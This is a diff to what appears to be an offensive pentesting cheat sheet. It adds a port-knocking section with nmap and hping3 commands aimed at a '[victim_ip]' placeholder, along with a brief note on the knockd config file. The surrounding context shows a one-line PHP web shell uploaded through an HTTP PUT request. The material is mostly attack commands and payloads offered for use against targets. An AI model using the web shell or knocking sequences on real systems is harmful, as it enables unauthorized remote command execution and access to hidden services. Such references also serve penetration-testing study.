@@ -100,6 +100,11 @@
   - [cadaver_tool](#cadaver_tool)
   - [Use_PUT_method](#Use_PUT_method)
  - [MongoDB](#MongoDB)
+ - [Port knocking](#Port_knocking)
+  - [Port knocking configure file](#configure_file)
+  - [Port knocking bash script](#bash_script)
+  - [Port knocking nmap port knocking](#nmap_port_knocking)
+  - [Port knocking hping port knocking](#hping_port_knocking)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -862,5 +867,27 @@ use burp
 PUT /test/shell.php
 
 <?php system($_GET["cmd"])?>
+```
+-------------------------------------------------------------------------------------------------------------------------------------
+# Port_knocking
+
+## configure_file
+```
+/etc/knocked.conf
+**squence** value its sequence of ports someone must access to open or close port.
+```
+## bash_script
+```
+for i in 7 2350 43;
+  do nmap -Pn -p $i --host-timeout 201 --max-retries 0 [victim_ip]; 
+done
+```
+## nmap_port_knocking
+```
+nmap -Pn -p $i --host-timeout 100 --max-retries 0 [victim_ip]; 
+```
+## hping_port_knocking
+```
+hping3 -S [victim_ip] -p 1 -c 1
 ```
 -------------------------------------------------------------------------------------------------------------------------------------
